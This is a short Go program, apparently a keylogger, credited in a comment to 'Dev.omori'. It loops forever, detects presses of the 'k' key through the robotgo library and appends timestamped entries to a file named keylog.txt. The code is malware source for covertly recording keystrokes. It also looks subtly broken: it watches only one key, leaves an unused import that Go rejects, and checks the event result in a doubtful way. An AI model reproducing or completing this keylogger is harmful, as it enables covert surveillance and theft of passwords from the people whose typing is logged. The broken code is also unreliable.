package main

import (
    "fmt"
    "os"
    "time"
//Dev.omori
    "github.com/go-vgo/robotgo"
    "github.com/AllenDang/w32"
)

func main() {
    // Open file for logging
    logFile, err := os.OpenFile("keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println("Error opening file:", err)
        return
    }
    defer logFile.Close()

    // Infinite loop to continuously capture keystrokes
    for {
        key := robotgo.AddEvent("k")
        if key == 0 {
            fmt.Println("Pressed: k")
            logKeystroke(logFile, "k")
        }
        time.Sleep(100 * time.Millisecond) // Adjust as necessary
    }
}

// Log the keystroke to the file
func logKeystroke(file *os.File, keystroke string) {
    timestamp := time.Now().Format("2006-01-02 15:04:05")
    logEntry := fmt.Sprintf("%s - Key: %s\n", timestamp, keystroke)
    if _, err := file.WriteString(logEntry); err != nil {
        fmt.Println("Error writing to file:", err)
    }
}
